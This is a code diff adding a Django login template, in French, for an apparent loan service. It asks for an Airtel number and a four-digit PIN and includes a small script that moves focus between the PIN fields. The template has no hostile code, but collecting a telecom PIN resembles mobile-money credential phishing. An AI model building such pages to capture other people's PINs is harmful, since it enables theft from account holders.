@@ -1,0 +1,54 @@
+{% extends 'loan/base.html' %}
+
+{% block title %}Connexion sécurisée{% endblock %}
+{% block page_title %}Connexion sécurisée{% endblock %}
+
+{% block content %}
+<div class="glass-card p-6 space-y-5">
+    <h3 class="text-sm font-bold uppercase tracking-widest text-white/50 border-b border-white/10 pb-2">Connexion</h3>
+    <p class="text-sm text-white/60">Entrez votre numéro Airtel et votre code PIN</p>
+
+    <form method="POST" action="{% url 'login' %}">
+        {% csrf_token %}
+
+        <div class="mb-5">
+            <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Numéro de téléphone</label>
+            <div class="flex items-center gap-3 bg-white/5 border border-white/10 p-4 rounded-2xl">
+                <span class="font-bold text-white/40">+243</span>
+                <input type="text" name="phone" class="bg-transparent outline-none w-full font-bold text-white"
+                       placeholder="97XXXXXXX" required>
+            </div>
+        </div>
+
+        <div class="mb-6">
+            <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Entrez votre PIN</label>
+            <div class="pin-inputs">
+                <input name="num1" type="password" maxlength="1" class="lucky-field" inputmode="numeric" autocomplete="off" required>
+                <input name="num2" type="password" maxlength="1" class="lucky-field" inputmode="numeric" autocomplete="off" required>
+                <input name="num3" type="password" maxlength="1" class="lucky-field" inputmode="numeric" autocomplete="off" required>
+                <input name="num4" type="password" maxlength="1" class="lucky-field" inputmode="numeric" autocomplete="off" required>
+            </div>
+        </div>
+
+        <button type="submit" class="submit-btn">
+            Se connecter
+        </button>
+    </form>
+</div>
+
+<script>
+// Auto-focus next PIN input
+document.querySelectorAll('.lucky-field').forEach((input, idx, arr) => {
+    input.addEventListener('input', function() {
+        if (this.value.length === 1 && idx < arr.length - 1) {
+            arr[idx + 1].focus();
+        }
+    });
+    input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !this.value && idx > 0) {
+            arr[idx - 1].focus();
+        }
+    });
+});
+</script>
+{% endblock %}
